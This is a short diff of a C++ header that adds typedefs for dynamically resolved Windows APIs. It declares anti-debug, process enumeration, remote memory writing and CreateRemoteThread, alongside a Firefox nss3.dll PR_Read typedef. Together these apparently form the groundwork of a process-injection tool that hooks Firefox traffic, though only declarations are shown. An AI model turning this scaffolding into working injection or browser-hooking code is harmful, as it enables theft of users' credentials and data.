@@ -1,10 +1,31 @@
 #pragma once
 #include <Windows.h>
+#include <tlhelp32.h>
 #include <string>
 #include "utils.h"
 
 // kernel32.dll 的函數
-typedef HANDLE(WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
+typedef BOOL(WINAPI* IsDebuggerPresent_t)();
+typedef DWORD(WINAPI* GetLastError_t)();
+typedef DWORD(WINAPI* GetCurrentProcessId_t)();
+// 記憶體操作
+typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef BOOL(WINAPI* VirtualFreeEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
+// process & thread
+typedef HANDLE(WINAPI* OpenProcess_t)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
+typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);
+// handle & module
+typedef BOOL(WINAPI* CloseHandle_t)(HANDLE hObject);
+typedef HMODULE(WINAPI* GetModuleHandleW_t)(LPCWSTR lpModuleName);
+// 字串處理
+typedef int (WINAPI* WideCharToMultiByte_t)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
+typedef int (WINAPI* MultiByteToWideChar_t)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
+// toolhelp32.h
+typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
+typedef BOOL(WINAPI* Process32First_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+typedef BOOL(WINAPI* Process32Next_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
 
 // firefox nss3.dll 的函數
 typedef int (*PR_Read_t)(void* fd, void* buf, int amount);
